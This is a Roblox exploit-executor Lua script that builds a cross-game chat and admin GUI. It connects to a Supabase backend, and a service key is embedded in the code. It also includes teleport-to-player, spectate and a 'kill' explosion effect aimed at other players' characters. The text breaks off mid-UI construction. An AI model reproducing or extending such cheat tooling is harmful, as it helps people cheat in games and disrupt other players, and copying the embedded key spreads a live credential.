
local request = (http and http.request) or http_request or (syn and (syn.request or syn.request))
if not request then
    warn("Your executor does not support HTTP requests.")
    return
end

local HttpService = game:GetService("HttpService")
local Players = game:GetService("Players")
local CoreGui = game:GetService("CoreGui")
local UserInputService = game:GetService("UserInputService")
local TeleportService = game:GetService("TeleportService")
local MarketplaceService = game:GetService("MarketplaceService")
local SoundService = game:GetService("SoundService")
local LocalPlayer = Players.LocalPlayer

local SUPABASE_URL = "https://nlavwcbdqcmoqmojraeu.supabase.co"
local SUPABASE_KEY = "sb_publishable__HC4Z5_wV2Daf8o-mgt89Q_z_JH2cif"

local KEY_FILENAME = "admin_key.txt"
local function loadLocalAdminKey()
    if isfile and readfile and isfile(KEY_FILENAME) then
        local raw = readfile(KEY_FILENAME)
        if raw then return string.match(raw, "^%s*(.-)%s*$") or "" end
    end
    return ""
end
local ADMIN_KEY = loadLocalAdminKey()

local JobId = game.JobId
local PlaceId = game.PlaceId
local Username = LocalPlayer.Name
local UserId = LocalPlayer.UserId
local IsAdmin = false
local IsSubAdmin = false
local SelectedTarget = "none"

local handledCommands = {}
local lastChatTime = 0
local lastTeleportTime = 0
local running = true
local currentTab = "users"
local soundEnabled = true
local searchQuery = ""
local historyFilter = "ALL"
local currentHistorySubTab = "log"
local cachedUsersData = {}
local cachedAdminPool = {}
local cachedUserIds = {}
local cachedUserExecutors = {}
local cachedHistoryData = {}
local userExecutorsHistory = {}

local function trackUserExecutor(uname, execName)
    if not uname or uname == "" or not execName or execName == "" then return end
    if not userExecutorsHistory[uname] then
        userExecutorsHistory[uname] = {}
    end
    userExecutorsHistory[uname][execName] = (userExecutorsHistory[uname][execName] or 0) + 1
end

local function getUserExecutorsList(uname)
    local list = {}
    if userExecutorsHistory[uname] then
        for ex, cnt in pairs(userExecutorsHistory[uname]) do
            table.insert(list, { name = ex, count = cnt })
        end
        table.sort(list, function(a, b) return a.count > b.count end)
    end
    return list
end

local historySaveFile = "chatroom_exec_history.json"
local function loadLocalExecHistory()
    pcall(function()
        if isfile and readfile and isfile(historySaveFile) then
            local data = HttpService:JSONDecode(readfile(historySaveFile))
            if type(data) == "table" then
                for u, map in pairs(data) do
                    if type(map) == "table" then
                        userExecutorsHistory[u] = userExecutorsHistory[u] or {}
                        for ex, cnt in pairs(map) do
                            userExecutorsHistory[u][ex] = tonumber(cnt) or 1
                        end
                    end
                end
            end
        end
    end)
end

local function saveLocalExecHistory()
    pcall(function()
        if writefile then
            writefile(historySaveFile, HttpService:JSONEncode(userExecutorsHistory))
        end
    end)
end
local spectatingPlayer = nil
local originalCameraSubject = nil
local lastChatCount = 0
local lastLoggedExecutor = ""
local lastLoggedGame = ""
local lastHistoryFetch = 0

_G.CurrentTpTarget = "none"
_G.CurrentActiveEffect = "none"

local gameName = "Roblox Game"
pcall(function()
    local info = MarketplaceService:GetProductInfo(PlaceId)
    if info and info.Name then gameName = info.Name end
end)

local function getExecutor()
    if identifyexecutor then
        local name = identifyexecutor()
        return name or "Potassium"
    end
    return "Potassium"
end
local myExecutor = getExecutor()
loadLocalExecHistory()
trackUserExecutor(Username, myExecutor)
saveLocalExecHistory()

local function getExecutorBadgeColor(execName)
    local low = string.lower(tostring(execName or ""))
    if string.find(low, "potassium") then
        return Color3.fromRGB(35, 165, 90)
    elseif string.find(low, "wave") then
        return Color3.fromRGB(88, 101, 242)
    elseif string.find(low, "solara") then
        return Color3.fromRGB(245, 158, 11)
    elseif string.find(low, "synapse") then
        return Color3.fromRGB(234, 88, 12)
    elseif string.find(low, "delta") then
        return Color3.fromRGB(168, 85, 247)
    elseif string.find(low, "codex") then
        return Color3.fromRGB(236, 72, 153)
    elseif string.find(low, "celery") then
        return Color3.fromRGB(16, 185, 129)
    elseif string.find(low, "fluxus") then
        return Color3.fromRGB(6, 182, 212)
    elseif string.find(low, "lynx") then
        return Color3.fromRGB(59, 130, 246)
    elseif string.find(low, "velocity") then
        return Color3.fromRGB(14, 165, 233)
    elseif string.find(low, "wrd") or string.find(low, "wearedevs") then
        return Color3.fromRGB(239, 68, 68)
    end
    return Color3.fromRGB(110, 115, 125)
end

local function cleanUrlDecode(str)
    str = string.gsub(str, "+", " ")
    str = string.gsub(str, "%%(%x%x)", function(hex)
        local n = tonumber(hex, 16)
        if n then
            return string.char(n)
        end
        return hex
    end)
    return str
end

local function parseIsoToUnix(isoStr)
    if not isoStr or type(isoStr) ~= "string" then return 0 end
    local year, month, day, hour, min, sec = isoStr:match("(%d+)-(%d+)-(%d+)[T ](%d+):(%d+):(%d+)")
    if year then
        return os.time({
            year = tonumber(year),
            month = tonumber(month),
            day = tonumber(day),
            hour = tonumber(hour),
            min = tonumber(min),
            sec = tonumber(sec)
        })
    end
    return 0
end

local function formatIsoToTime(isoStr)
    if not isoStr or type(isoStr) ~= "string" then return "" end
    local unix = parseIsoToUnix(isoStr)
    if unix > 0 then
        local d = os.date("*t", unix)
        return string.format("%02d:%02d", d.hour, d.min)
    end
    local hour, min = isoStr:match("[T ](%d+):(%d+)")
    if hour and min then return hour .. ":" .. min end
    return ""
end

local function isUserOnline(isoStr)
    local userTime = parseIsoToUnix(isoStr)
    if userTime == 0 then return false end
    local nowUtc = os.time(os.date("!*t"))
    return math.abs(nowUtc - userTime) <= 45
end

local function sanitizeText(text)
    local clean = string.gsub(tostring(text or ""), "<[^>]*>", "")
    if #clean > 1000 then clean = string.sub(clean, 1, 1000) end
    return clean
end

local function copyToClipboard(str)
    local fn = setclipboard or toclipboard or (Clipboard and Clipboard.set) or (syn and syn.write_clipboard)
    if fn then
        pcall(fn, tostring(str))
        return true
    end
    return false
end

local function playSound(soundId, volume)
    if not soundEnabled then return end
    task.spawn(function()
        pcall(function()
            local s = Instance.new("Sound")
            s.SoundId = soundId
            s.Volume = volume or 0.4
            s.Parent = SoundService
            s:Play()
            s.Ended:Connect(function() s:Destroy() end)
            task.delay(3, function() if s and s.Parent then s:Destroy() end end)
        end)
    end)
end

local function getAvatarThumb(uid, uname)
    local numId = tonumber(uid)
    if numId and numId > 0 then
        return "rbxthumb://type=AvatarHeadShot&id=" .. numId .. "&w=150&h=150"
    end
    if uname then
        if cachedUserIds[uname] and tonumber(cachedUserIds[uname]) and tonumber(cachedUserIds[uname]) > 0 then
            return "rbxthumb://type=AvatarHeadShot&id=" .. cachedUserIds[uname] .. "&w=150&h=150"
        end
        local p = Players:FindFirstChild(uname)
        if p and p.UserId > 0 then
            cachedUserIds[uname] = p.UserId
            return "rbxthumb://type=AvatarHeadShot&id=" .. p.UserId .. "&w=150&h=150"
        end
    end
    return "rbxthumb://type=AvatarHeadShot&id=1&w=150&h=150"
end

local function runLocalExplosionEffect(targetName)
    local targetPlayer = Players:FindFirstChild(targetName)
    if targetPlayer and targetPlayer.Character and targetPlayer.Character:FindFirstChild("HumanoidRootPart") then
        local char = targetPlayer.Character
        local exp = Instance.new("Explosion")
        exp.Position = char.HumanoidRootPart.Position
        exp.BlastRadius = 0
        exp.BlastPressure = 0
        exp.Parent = workspace
        if char:FindFirstChild("Humanoid") then char.Humanoid.Health = 0 end
        char:BreakJoints()
        for _, part in ipairs(char:GetChildren()) do
            if part:IsA("BasePart") then
                part.Velocity = Vector3.new(math.random(-100, 100), math.random(80, 150), math.random(-100, 100))
            end
        end
    end
end

local function teleportToPlayerInServer(targetPlayer)
    if not targetPlayer or not targetPlayer.Character then return false end
    local targetHrp = targetPlayer.Character:FindFirstChild("HumanoidRootPart")
    local myChar = LocalPlayer.Character
    local myHrp = myChar and myChar:FindFirstChild("HumanoidRootPart")
    local myHum = myChar and myChar:FindFirstChildOfClass("Humanoid")
    if targetHrp and myHrp then
        if myHum then myHum.Sit = false end
        myHrp.CFrame = targetHrp.CFrame + Vector3.new(0, 3, 2)
        myHrp.AssemblyLinearVelocity = Vector3.zero
        return true
    end
    return false
end

local Camera = workspace.CurrentCamera
local function spectatePlayer(targetPlayer)
    if not targetPlayer or not targetPlayer.Character then return false end
    local hum = targetPlayer.Character:FindFirstChildOfClass("Humanoid")
    if hum then
        if not spectatingPlayer then
            originalCameraSubject = Camera.CameraSubject
        end
        spectatingPlayer = targetPlayer
        Camera.CameraSubject = hum
        return true
    end
    return false
end

local function stopSpectate()
    if spectatingPlayer then
        spectatingPlayer = nil
        local myChar = LocalPlayer.Character
        local myHum = myChar and myChar:FindFirstChildOfClass("Humanoid")
        Camera.CameraSubject = myHum or originalCameraSubject or Camera.CameraSubject
    end
end

local ScreenGui = Instance.new("ScreenGui")
ScreenGui.Name = "ChatRoom"
ScreenGui.ResetOnSpawn = false
ScreenGui.DisplayOrder = 999
pcall(function()
    ScreenGui.Parent = CoreGui
end)
if not ScreenGui.Parent then
    ScreenGui.Parent = LocalPlayer:WaitForChild("PlayerGui")
end

local SpectateHud = Instance.new("Frame")
SpectateHud.Name = "ChatRoomSpectateHud"
SpectateHud.Size = UDim2.new(0, 270, 0, 36)
SpectateHud.Position = UDim2.new(0.5, -135, 0, 15)
SpectateHud.BackgroundColor3 = Color3.fromRGB(22, 23, 27)
SpectateHud.BorderSizePixel = 0
SpectateHud.Visible = false
SpectateHud.Parent = ScreenGui
Instance.new("UICorner", SpectateHud).CornerRadius = UDim.new(0, 8)
local spectateStroke = Instance.new("UIStroke", SpectateHud)
spectateStroke.Color = Color3.fromRGB(88, 101, 242)
spectateStroke.Thickness = 1.5

local SpectateText = Instance.new("TextLabel")
SpectateText.Size = UDim2.new(1, -75, 1, 0)
SpectateText.Position = UDim2.new(0, 10, 0, 0)
SpectateText.BackgroundTransparency = 1
SpectateText.Text = "👁️ Spectating..."
SpectateText.TextColor3 = Color3.fromRGB(242, 243, 245)
SpectateText.Font = Enum.Font.GothamBold
SpectateText.TextSize = 12
SpectateText.TextXAlignment = Enum.TextXAlignment.Left
SpectateText.TextTruncate = Enum.TextTruncate.AtEnd
SpectateText.Parent = SpectateHud

local SpectateStopBtn = Instance.new("TextButton")
SpectateStopBtn.Size = UDim2.new(0, 60, 0, 24)
SpectateStopBtn.Position = UDim2.new(1, -68, 0, 6)
SpectateStopBtn.BackgroundColor3 = Color3.fromRGB(237, 66, 69)
SpectateStopBtn.Text = "Stop X"
SpectateStopBtn.TextColor3 = Color3.fromRGB(255, 255, 255)
SpectateStopBtn.Font = Enum.Font.GothamBold
SpectateStopBtn.TextSize = 11
SpectateStopBtn.Parent = SpectateHud
Instance.new("UICorner", SpectateStopBtn).CornerRadius = UDim.new(0, 4)

local WindowFrame = Instance.new("Frame")
WindowFrame.Name = "MainWindow"
WindowFrame.Size = UDim2.new(0, 780, 0, 500)
WindowFrame.Position = UDim2.new(0.5, -390, 0.5, -250)
WindowFrame.BackgroundColor3 = Color3.fromRGB(30, 31, 35)
WindowFrame.BorderSizePixel = 0
WindowFrame.Active = true
WindowFrame.Parent = ScreenGui
Instance.new("UICorner", WindowFrame).CornerRadius = UDim.new(0, 10)
local winStroke = Instance.new("UIStroke", WindowFrame)
winStroke.Color = Color3.fromRGB(48, 50, 58)
winStroke.Thickness = 1

local TitleBar = Instance.new("Frame")
TitleBar.Name = "TitleBar"
TitleBar.Size = UDim2.new(1, 0, 0, 38)
TitleBar.BackgroundColor3 = Color3.fromRGB(22, 23, 27)
TitleBar.BorderSizePixel = 0
TitleBar.Parent = WindowFrame
Instance.new("UICorner", TitleBar).CornerRadius = UDim.new(0, 10)

local TitleBarCover = Instance.new("Frame")
TitleBarCover.Size = UDim2.new(1, 0, 0, 10)
TitleBarCover.Position = UDim2.new(0, 0, 1, -10)
TitleBarCover.BackgroundColor3 = Color3.fromRGB(22, 23, 27)
TitleBarCover.BorderSizePixel = 0
TitleBarCover.Parent = TitleBar

local TitleIcon = Instance.new("TextLabel")
TitleIcon.Size = UDim2.new(0, 24, 0, 24)
TitleIcon.Position = UDim2.new(0, 12, 0, 7)
TitleIcon.BackgroundTransparency = 1
TitleIcon.Text = "💬"
TitleIcon.TextSize = 16
TitleIcon.Parent = TitleBar

local TitleText = Instance.new("TextLabel")
TitleText.Size = UDim2.new(0, 100, 1, 0)
TitleText.Position = UDim2.new(0, 40, 0, 0)
TitleText.BackgroundTransparency = 1
TitleText.Text = "Chat Room"
TitleText.TextColor3 = Color3.fromRGB(242, 243, 245)
TitleText.Font = Enum.Font.GothamBold
TitleText.TextSize = 14
TitleText.TextXAlignment = Enum.TextXAlignment.Left
TitleText.Parent = TitleBar

local SubTitleText = Instance.new("TextLabel")
SubTitleText.Size = UDim2.new(0, 140, 1, 0)
SubTitleText.Position = UDim2.new(0, 138, 0, 0)
SubTitleText.BackgroundTransparency = 1
SubTitleText.Text = "• Cross-Game Network"
SubTitleText.TextColor3 = Color3.fromRGB(148, 155, 164)
SubTitleText.Font = Enum.Font.Gotham
SubTitleText.TextSize = 11
SubTitleText.TextXAlignment = Enum.TextXAlignment.Left
SubTitleText.Parent = TitleBar

local OnlineCounterPill = Instance.new("Frame")
OnlineCounterPill.Size = UDim2.new(0, 140, 0, 22)
OnlineCounterPill.Position = UDim2.new(0, 290, 0, 8)
OnlineCounterPill.BackgroundColor3 = Color3.fromRGB(33, 35, 40)
OnlineCounterPill.BorderSizePixel = 0
OnlineCounterPill.Parent = TitleBar
Instance.new("UICorner", OnlineCounterPill).CornerRadius = UDim.new(0, 11)

local OnlineCounterText = Instance.new("TextLabel")
OnlineCounterText.Size = UDim2.new(1, 0, 1, 0)
OnlineCounterText.BackgroundTransparency = 1
OnlineCounterText.Text = "🟢 0 Online"
OnlineCounterText.TextColor3 = Color3.fromRGB(53, 219, 131)
OnlineCounterText.Font = Enum.Font.GothamBold
OnlineCounterText.TextSize = 11
OnlineCounterText.Parent = OnlineCounterPill

local Controls = Instance.new("Frame")
Controls.Size = UDim2.new(0, 110, 1, 0)
Controls.Position = UDim2.new(1, -115, 0, 0)
Controls.BackgroundTransparency = 1
Controls.Parent = TitleBar

local SoundBtn = Instance.new("TextButton")
SoundBtn.Size = UDim2.new(0, 30, 0, 30)
SoundBtn.Position = UDim2.new(0, 0, 0, 4)
SoundBtn.BackgroundTransparency = 1
SoundBtn.Text = "🔊"
SoundBtn.TextColor3 = Color3.fromRGB(181, 186, 193)
SoundBtn.Font = Enum.Font.GothamBold
SoundBtn.TextSize = 14
SoundBtn.Parent = Controls

local MinBtn = Instance.new("TextButton")
MinBtn.Size = UDim2.new(0, 30, 0, 30)
MinBtn.Position = UDim2.new(0, 36, 0, 4)
MinBtn.BackgroundTransparency = 1
MinBtn.Text = "-"
MinBtn.TextColor3 = Color3.fromRGB(181, 186, 193)
MinBtn.Font = Enum.Font.GothamBold
MinBtn.TextSize = 14
MinBtn.Parent = Controls
Instance.new("UICorner", MinBtn).CornerRadius = UDim.new(0, 4)

MinBtn.MouseEnter:Connect(function()
    MinBtn.BackgroundColor3 = Color3.fromRGB(43, 45, 49)
    MinBtn.BackgroundTransparency = 0
    MinBtn.TextColor3 = Color3.fromRGB(255, 255, 255)
end)
MinBtn.MouseLeave:Connect(function()
    MinBtn.BackgroundTransparency = 1
    MinBtn.TextColor3 = Color3.fromRGB(181, 186, 193)
end)

local CloseBtn = Instance.new("TextButton")
CloseBtn.Size = UDim2.new(0, 30, 0, 30)
CloseBtn.Position = UDim2.new(0, 72, 0, 4)
CloseBtn.BackgroundTransparency = 1
CloseBtn.Text = "X"
CloseBtn.TextColor3 = Color3.fromRGB(181, 186, 193)
CloseBtn.Font = Enum.Font.GothamBold
CloseBtn.TextSize = 14
CloseBtn.Parent = Controls
Instance.new("UICorner", CloseBtn).CornerRadius = UDim.new(0, 4)

CloseBtn.MouseEnter:Connect(function()
    CloseBtn.BackgroundColor3 = Color3.fromRGB(237, 66, 69)
    CloseBtn.BackgroundTransparency = 0
    CloseBtn.TextColor3 = Color3.fromRGB(255, 255, 255)
end)
CloseBtn.MouseLeave:Connect(function()
    CloseBtn.BackgroundTransparency = 1
    CloseBtn.TextColor3 = Color3.fromRGB(181, 186, 193)
end)

local BodyFrame = Instance.new("Frame")
BodyFrame.Name = "BodyFrame"
BodyFrame.Size = UDim2.new(1, 0, 1, -38)
BodyFrame.Position = UDim2.new(0, 0, 0, 38)
BodyFrame.BackgroundTransparency = 1
BodyFrame.Parent = WindowFrame

local ToastLabel = Instance.new("TextLabel")
ToastLabel.Name = "ToastLabel"
ToastLabel.Size = UDim2.new(0, 340, 0, 32)
ToastLabel.Position = UDim2.new(0.5, -170, 1, -44)
ToastLabel.BackgroundColor3 = Color3.fromRGB(20, 21, 25)
ToastLabel.BorderSizePixel = 0
ToastLabel.Text = ""
ToastLabel.TextColor3 = Color3.fromRGB(255, 255, 255)
ToastLabel.Font = Enum.Font.GothamBold
ToastLabel.TextSize = 12
ToastLabel.Visible = false
ToastLabel.ZIndex = 100
ToastLabel.Parent = WindowFrame
Instance.new("UICorner", ToastLabel).CornerRadius = UDim.new(0, 6)
local toastStroke = Instance.new("UIStroke", ToastLabel)
toastStroke.Color = Color3.fromRGB(60, 63, 72)
toastStroke.Thickness = 1

local function showToast(message, color)
    task.spawn(function()
        ToastLabel.Text = message
        ToastLabel.TextColor3 = color or Color3.fromRGB(255, 255, 255)
        ToastLabel.Visible = true
        ToastLabel.BackgroundTransparency = 0.15
        ToastLabel.TextTransparency = 0
        task.wait(2.2)
        for i = 0, 1, 0.2 do
            ToastLabel.BackgroundTransparency = 0.15 + (i * 0.85)
            ToastLabel.TextTransparency = i
            task.wait(0.03)
        end
        ToastLabel.Visible = false
    end)
end

local Sidebar = Instance.new("Frame")
Sidebar.Name = "Sidebar"
Sidebar.Size = UDim2.new(0, 205, 1, 0)
Sidebar.BackgroundColor3 = Color3.fromRGB(24, 25, 28)
Sidebar.BorderSizePixel = 0
Sidebar.Parent = BodyFrame

local CatCommunity = Instance.new("TextLabel")
CatCommunity.Size = UDim2.new(1, -24, 0, 18)
CatCommunity.Position = UDim2.new(0, 12, 0, 10)
CatCommunity.BackgroundTransparency = 1
CatCommunity.Text = "COMMUNITY"
CatCommunity.TextColor3 = Color3.fromRGB(120, 125, 134)
CatCommunity.Font = Enum.Font.GothamBold
CatCommunity.TextSize = 10
CatCommunity.TextXAlignment = Enum.TextXAlignment.Left
CatCommunity.Parent = Sidebar

local ChannelUsers = Instance.new("TextButton")
ChannelUsers.Size = UDim2.new(1, -16, 0, 32)
ChannelUsers.Position = UDim2.new(0, 8, 0, 28)
ChannelUsers.BackgroundColor3 = Color3.fromRGB(53, 55, 60)
ChannelUsers.Text = "   👥  users-network"
ChannelUsers.TextColor3 = Color3.fromRGB(255, 255, 255)
ChannelUsers.Font = Enum.Font.GothamSemibold
ChannelUsers.TextSize = 12
ChannelUsers.TextXAlignment = Enum.TextXAlignment.Left
ChannelUsers.Parent = Sidebar
Instance.new("UICorner", ChannelUsers).CornerRadius = UDim.new(0, 5)

local ChannelGlobalChat = Instance.new("TextButton")
ChannelGlobalChat.Size = UDim2.new(1, -16, 0, 32)
ChannelGlobalChat.Position = UDim2.new(0, 8, 0, 64)
ChannelGlobalChat.BackgroundTransparency = 1
ChannelGlobalChat.Text = "   💬  global-cross-chat"
ChannelGlobalChat.TextColor3 = Color3.fromRGB(148, 155, 164)
ChannelGlobalChat.Font = Enum.Font.GothamSemibold
ChannelGlobalChat.TextSize = 12
ChannelGlobalChat.TextXAlignment = Enum.TextXAlignment.Left
ChannelGlobalChat.Parent = Sidebar
Instance.new("UICorner", ChannelGlobalChat).CornerRadius = UDim.new(0, 5)

local ChannelServerChat = Instance.new("TextButton")
ChannelServerChat.Size = UDim2.new(1, -16, 0, 32)
ChannelServerChat.Position = UDim2.new(0, 8, 0, 100)
ChannelServerChat.BackgroundTransparency = 1
ChannelServerChat.Text = "   🎮  server-chat"
ChannelServerChat.TextColor3 = Color3.fromRGB(148, 155, 164)
ChannelServerChat.Font = Enum.Font.GothamSemibold
ChannelServerChat.TextSize = 12
ChannelServerChat.TextXAlignment = Enum.TextXAlignment.Left
ChannelServerChat.Parent = Sidebar
Instance.new("UICorner", ChannelServerChat).CornerRadius = UDim.new(0, 5)

local ChannelHistory = Instance.new("TextButton")
ChannelHistory.Size = UDim2.new(1, -16, 0, 32)
ChannelHistory.Position = UDim2.new(0, 8, 0, 136)
ChannelHistory.BackgroundTransparency = 1
ChannelHistory.Text = "   📊  executor-history"
ChannelHistory.TextColor3 = Color3.fromRGB(148, 155, 164)
ChannelHistory.Font = Enum.Font.GothamSemibold
ChannelHistory.TextSize = 12
ChannelHistory.TextXAlignment = Enum.TextXAlignment.Left
ChannelHistory.Parent = Sidebar
Instance.new("UICorner", ChannelHistory).CornerRadius = UDim.new(0, 5)

local CatAdmin = Instance.new("TextLabel")
CatAdmin.Size = UDim2.new(1, -24, 0, 18)
CatAdmin.Position = UDim2.new(0, 12, 0, 176)
CatAdmin.BackgroundTransparency = 1
CatAdmin.Text = "ADMINISTRATION"
CatAdmin.TextColor3 = Color3.fromRGB(120, 125, 134)
CatAdmin.Font = Enum.Font.GothamBold
CatAdmin.TextSize = 10
CatAdmin.TextXAlignment = Enum.TextXAlignment.Left
CatAdmin.Visible = false
CatAdmin.Parent = Sidebar

local ChannelExecPanel = Instance.new("TextButton")
ChannelExecPanel.Size = UDim2.new(1, -16, 0, 32)
ChannelExecPanel.Position = UDim2.new(0, 8, 0, 196)
ChannelExecPanel.BackgroundTransparency = 1
ChannelExecPanel.Text = "   🛠️  executor-panel"
ChannelExecPanel.TextColor3 = Color3.fromRGB(148, 155, 164)
ChannelExecPanel.Font = Enum.Font.GothamSemibold
ChannelExecPanel.TextSize = 12
ChannelExecPanel.TextXAlignment = Enum.TextXAlignment.Left
ChannelExecPanel.Visible = false
ChannelExecPanel.Parent = Sidebar
Instance.new("UICorner", ChannelExecPanel).CornerRadius = UDim.new(0, 5)

local UserBottomBar = Instance.new("Frame")
UserBottomBar.Size = UDim2.new(1, 0, 0, 52)
UserBottomBar.Position = UDim2.new(0, 0, 1, -52)
UserBottomBar.BackgroundColor3 = Color3.fromRGB(18, 19, 21)
UserBottomBar.BorderSizePixel = 0
UserBottomBar.Parent = Sidebar

local MyAvatarImg = Instance.new("ImageLabel")
MyAvatarImg.Size = UDim2.new(0, 34, 0, 34)
MyAvatarImg.Position = UDim2.new(0, 10, 0, 9)
MyAvatarImg.BackgroundColor3 = Color3.fromRGB(35, 37, 42)
MyAvatarImg.BorderSizePixel = 0
MyAvatarImg.Image = getAvatarThumb(UserId, Username)
MyAvatarImg.Parent = UserBottomBar
Instance.new("UICorner", MyAvatarImg).CornerRadius = UDim.new(1, 0)

local MyStatusDot = Instance.new("Frame")
MyStatusDot.Size = UDim2.new(0, 10, 0, 10)
MyStatusDot.Position = UDim2.new(1, -9, 1, -9)
MyStatusDot.BackgroundColor3 = Color3.fromRGB(35, 165, 90)
MyStatusDot.BorderSizePixel = 0
MyStatusDot.Parent = MyAvatarImg
Instance.new("UICorner", MyStatusDot).CornerRadius = UDim.new(1, 0)

local MyNameContainer = Instance.new("Frame")
MyNameContainer.Size = UDim2.new(1, -56, 0, 18)
MyNameContainer.Position = UDim2.new(0, 50, 0, 8)
MyNameContainer.BackgroundTransparency = 1
MyNameContainer.Parent = UserBottomBar

local MyNameLayout = Instance.new("UIListLayout", MyNameContainer)
MyNameLayout.FillDirection = Enum.FillDirection.Horizontal
MyNameLayout.VerticalAlignment = Enum.VerticalAlignment.Center
MyNameLayout.Padding = UDim.new(0, 5)

local MyNameLabel = Instance.new("TextLabel")
MyNameLabel.Size = UDim2.new(0, 0, 1, 0)
MyNameLabel.AutomaticSize = Enum.AutomaticSize.X
MyNameLabel.BackgroundTransparency = 1
MyNameLabel.Text = Username
MyNameLabel.TextColor3 = Color3.fromRGB(242, 243, 245)
MyNameLabel.Font = Enum.Font.GothamBold
MyNameLabel.TextSize = 12
MyNameLabel.TextXAlignment = Enum.TextXAlignment.Left
MyNameLabel.Parent = MyNameContainer

local MyExecBadge = Instance.new("Frame")
MyExecBadge.Size = UDim2.new(0, 0, 0, 16)
MyExecBadge.AutomaticSize = Enum.AutomaticSize.X
MyExecBadge.BackgroundColor3 = getExecutorBadgeColor(myExecutor)
MyExecBadge.BorderSizePixel = 0
MyExecBadge.Parent = MyNameContainer
Instance.new("UICorner", MyExecBadge).CornerRadius = UDim.new(0, 4)

local MyExecText = Instance.new("TextLabel")
MyExecText.Size = UDim2.new(0, 0, 1, 0)
MyExecText.AutomaticSize = Enum.AutomaticSize.X
MyExecText.BackgroundTransparency = 1
MyExecText.Font = Enum.Font.GothamBold
MyExecText.TextSize = 9
MyExecText.TextColor3 = Color3.fromRGB(255, 255, 255)
MyExecText.Text = " ⚙️ " .. myExecutor .. " "
MyExecText.Parent = MyExecBadge

local MySubLabel = Instance.new("TextLabel")
MySubLabel.Size = UDim2.new(1, -56, 0, 16)
MySubLabel.Position = UDim2.new(0, 50, 0, 27)
MySubLabel.BackgroundTransparency = 1
MySubLabel.Text = "🟢 Online • Roblox Game"
MySubLabel.TextColor3 = Color3.fromRGB(148, 155, 164)
MySubLabel.Font = Enum.Font.Gotham
MySubLabel.TextSize = 10
MySubLabel.TextXAlignment = Enum.TextXAlignment.Left
MySubLabel.TextTruncate = Enum.TextTruncate.AtEnd
MySubLabel.Parent = UserBottomBar

local ViewContainer = Instance.new("Frame")
ViewContainer.Size = UDim2.new(1, -205, 1, 0)
ViewContainer.Position = UDim2.new(0, 205, 0, 0)
ViewContainer.BackgroundTransparency = 1
ViewContainer.Parent = BodyFrame

local UsersView = Instance.new("Frame")
UsersView.Size = UDim2.new(1, -20, 1, -16)
UsersView.Position = UDim2.new(0, 10, 0, 8)
UsersView.BackgroundTransparency = 1
UsersView.Parent = ViewContainer

local SearchContainer = Instance.new("Frame")
SearchContainer.Size = UDim2.new(1, 0, 0, 32)
SearchContainer.BackgroundColor3 = Color3.fromRGB(22, 23, 26)
SearchContainer.BorderSizePixel = 0
SearchContainer.Parent = UsersView
Instance.new("UICorner", SearchContainer).CornerRadius = UDim.new(0, 6)
local searchStroke = Instance.new("UIStroke", SearchContainer)
searchStroke.Color = Color3.fromRGB(48, 50, 56)
searchStroke.Thickness = 1

local SearchIcon = Instance.new("TextLabel")
SearchIcon.Size = UDim2.new(0, 28, 1, 0)
SearchIcon.BackgroundTransparency = 1
SearchIcon.Text = "🔍"
SearchIcon.TextSize = 12
SearchIcon.Parent = SearchContainer

local SearchBox = Instance.new("TextBox")
SearchBox.Size = UDim2.new(1, -62, 1, 0)
SearchBox.Position = UDim2.new(0, 30, 0, 0)
SearchBox.BackgroundTransparency = 1
SearchBox.PlaceholderText = "Search network users or games in real-time..."
SearchBox.PlaceholderColor3 = Color3.fromRGB(120, 125, 134)
SearchBox.TextColor3 = Color3.fromRGB(242, 243, 245)
SearchBox.Font = Enum.Font.Gotham
SearchBox.TextSize = 12
SearchBox.TextXAlignment = Enum.TextXAlignment.Left
SearchBox.ClearTextOnFocus = true
SearchBox.Text = ""
SearchBox.Parent = SearchContainer

local SearchClearBtn = Instance.new("TextButton")
SearchClearBtn.Size = UDim2.new(0, 24, 0, 24)
SearchClearBtn.Position = UDim2.new(1, -28, 0.5, -12)
SearchClearBtn.BackgroundTransparency = 1
SearchClearBtn.Text = "X"
SearchClearBtn.TextColor3 = Color3.fromRGB(148, 155, 164)
SearchClearBtn.Font = Enum.Font.GothamBold
SearchClearBtn.TextSize = 12
SearchClearBtn.Parent = SearchContainer

local UsersScroller = Instance.new("ScrollingFrame")
UsersScroller.Size = UDim2.new(1, 0, 1, -40)
UsersScroller.Position = UDim2.new(0, 0, 0, 40)
UsersScroller.BackgroundTransparency = 1
UsersScroller.BorderSizePixel = 0
UsersScroller.ScrollBarThickness = 4
UsersScroller.Parent = UsersView

local UsersLayout = Instance.new("UIListLayout", UsersScroller)
UsersLayout.SortOrder = Enum.SortOrder.LayoutOrder
UsersLayout.Padding = UDim.new(0, 4)

UsersLayout:GetPropertyChangedSignal("AbsoluteContentSize"):Connect(function()
    UsersScroller.CanvasSize = UDim2.new(0, 0, 0, UsersLayout.AbsoluteContentSize.Y + 14)
end)

local ChatView = Instance.new("Frame")
ChatView.Size = UDim2.new(1, -20, 1, -16)
ChatView.Position = UDim2.new(0, 10, 0, 8)
ChatView.BackgroundTransparency = 1
ChatView.Visible = false
ChatView.Parent = ViewContainer

local ChatHeader = Instance.new("Frame")
ChatHeader.Size = UDim2.new(1, 0, 0, 28)
ChatHeader.BackgroundTransparency = 1
ChatHeader.Parent = ChatView

local ChatChannelTitle = Instance.new("TextLabel")
ChatChannelTitle.Size = UDim2.new(0.5, 0, 1, 0)
ChatChannelTitle.BackgroundTransparency = 1
ChatChannelTitle.Text = "💬 # global-cross-chat"
ChatChannelTitle.TextColor3 = Color3.fromRGB(242, 243, 245)
ChatChannelTitle.Font = Enum.Font.GothamBold
ChatChannelTitle.TextSize = 13
ChatChannelTitle.TextXAlignment = Enum.TextXAlignment.Left
ChatChannelTitle.Parent = ChatHeader

local ChatChannelDesc = Instance.new("TextLabel")
ChatChannelDesc.Size = UDim2.new(0.5, 0, 1, 0)
ChatChannelDesc.Position = UDim2.new(0.5, 0, 0, 0)
ChatChannelDesc.BackgroundTransparency = 1
ChatChannelDesc.Text = "Cross-game network communication"
ChatChannelDesc.TextColor3 = Color3.fromRGB(120, 125, 134)
ChatChannelDesc.Font = Enum.Font.Gotham
ChatChannelDesc.TextSize = 11
ChatChannelDesc.TextXAlignment = Enum.TextXAlignment.Right
ChatChannelDesc.Parent = ChatHeader

local ChatScrolling = Instance.new("ScrollingFrame")
ChatScrolling.Size = UDim2.new(1, 0, 1, -95)
ChatScrolling.Position = UDim2.new(0, 0, 0, 30)
ChatScrolling.BackgroundTransparency = 1
ChatScrolling.BorderSizePixel = 0
ChatScrolling.ScrollBarThickness = 4
ChatScrolling.Parent = ChatView

